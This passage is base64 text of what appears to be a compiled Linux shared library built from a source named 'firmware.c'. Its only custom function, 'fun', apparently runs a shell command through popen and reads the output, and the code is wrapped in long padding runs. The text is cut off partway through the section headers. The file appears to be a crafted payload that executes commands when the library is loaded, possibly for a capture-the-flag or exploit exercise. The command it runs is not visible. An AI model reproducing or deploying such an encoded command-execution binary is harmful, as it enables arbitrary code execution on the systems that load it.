AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiD7AhIiwXVLwAASIXAdAL/0EiDxAjDAAAAAAAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////JdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JYIvAABmkAAAAAAAAAAASI09wS8AAEiNBbovAABIOfh0FUiLBT4vAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI09kS8AAEiNNYovAABIKf5Iwf4DSInwSMHoP0gBxkjR/nQUSIsFFS8AAEiFwHQI/+BmDx9EAADDDx+AAAAAAIA9aS8AAAB1L1VIgz32LgAAAEiJ5XQMSIs9Ki8AAOhd////6Gj////GBUEvAAABXcMPH4AAAAAAww8fgAAAAADpe////1VIieVIg+wQSIsFpC4AAEiLALowAQAAvgAAAABIicfo9/7//0iNNaAOAABIjT2hDgAA6PT+//9IiUX4SIN9+AB0MUiLBWouAABIiwBIi1X4SInRugABAAC+AQAAAEiJx+iW/v//SItF+EiJx+ia/v//6wGQycMASIPsCEiDxAjDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAARsDOyAAAAADAAAAFO///zwAAABk7///ZAAAACnw//98AAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAADQ7v//UAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA+O7//wgAAAAAAAAAAAAAABwAAABcAAAApe///3YAAAAAQQ4QhgJDDQYCcQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADARAAAAAAAAAAAAAAAAAADwEAAAAAAAAAEAAAAAAAAAfAAAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACsEQAAAAAAABkAAAAAAAAAAD4AAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAGACAAAAAAAABQAAAAAAAACwAwAAAAAAAAYAAAAAAAAAkAIAAAAAAAAKAAAAAAAAAJIAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAAEAAAAAAAAACAAAAAAAAAGAAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAcAUAAAAAAAAHAAAAAAAAAIAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAGAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAQgQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAA4QAAAAAAAAAAAAAAAAAAAR0NDOiAoRGViaWFuIDguMy4wLTYpIDguMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAGACAAAAAAAAAAAAAAAAAAAAAAAAAwADAJACAAAAAAAAAAAAAAAAAAAAAAAAAwAEALADAAAAAAAAAAAAAAAAAAAAAAAAAwAFAEIEAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAHAFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAAAQAAAAAAAAAAAAAAAAAAAAAAAAAwAKACAQAAAAAAAAAAAAAAAAAAAAAAAAAwALAHAQAAAAAAAAAAAAAAAAAAAAAAAAAwAMAIAQAAAAAAAAAAAAAAAAAAAAAAAAAwANAKwRAAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAgAAAAAAAAAAAAAAAAAAAAAAAAAwAPAAwhAAAAAAAAAAAAAAAAAAAAAAAAAwAQADAhAAAAAAAAAAAAAAAAAAAAAAAAAwARAAA+AAAAAAAAAAAAAAAAAAAAAAAAAwASABA+AAAAAAAAAAAAAAAAAAAAAAAAAwATABg+AAAAAAAAAAAAAAAAAAAAAAAAAwAUANg/AAAAAAAAAAAAAAAAAAAAAAAAAwAVAABAAAAAAAAAAAAAAAAAAAAAAAAAAwAWADhAAAAAAAAAAAAAAAAAAAAAAAAAAwAXAGBAAAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAIAQAAAAAAAAAAAAAAAAAAAOAAAAAgAMALAQAAAAAAAAAAAAAAAAAAAhAAAAAgAMAPAQAAAAAAAAAAAAAAAAAAA3AAAAAQAXAGBAAAAAAAAAAQAAAAAAAABGAAAAAQASABA+AAAAAAAAAAAAAAAAAABtAAAAAgAMADARAAAAAAAAAAAAAAAAAAB5AAAAAQARAAA+AAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACjAAAAAQAQAKghAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACxAAAAAgANAKwRAAAAAAAAAAAAAAAAAAC3AAAAAQAWADhAAAAAAAAAAAAAAAAAAADEAAAAAQATABg+AAAAAAAAAAAAAAAAAADNAAAAAAAPAAwhAAAAAAAAAAAAAAAAAADgAAAAAQAWAEhAAAAAAAAAAAAAAAAAAADsAAAAAQAVAABAAAAAAAAAAAAAAAAAAAACAQAAAgAJAAAQAAAAAAAAAAAAAAAAAAAIAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAkAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA3AQAAEgAMADURAAAAAAAAdgAAAAAAAAA7AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABPAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABjAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQAWAEBAAAAAAAAACAAAAAAAAAByAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACFAQAAEQAXAIBAAAAAAAAAMAEAAAAAAACOAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACoAQAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjczMjUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGZpcm13YXJlLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAZnJlYWRAQEdMSUJDXzIuMi41AGZ1bgBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AcG9wZW5AQEdMSUJDXzIuMi41AF92ZXJzaW9uAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAkAIAAAAAAACQAgAAAAAAACABAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAALADAAAAAAAAsAMAAAAAAACSAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABCBAAAAAAAAEIEAAAAAAAAGAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAYAQAAAAAAABgBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAADwAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABwBQAAAAAAAHAFAAAAAAAAYAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAA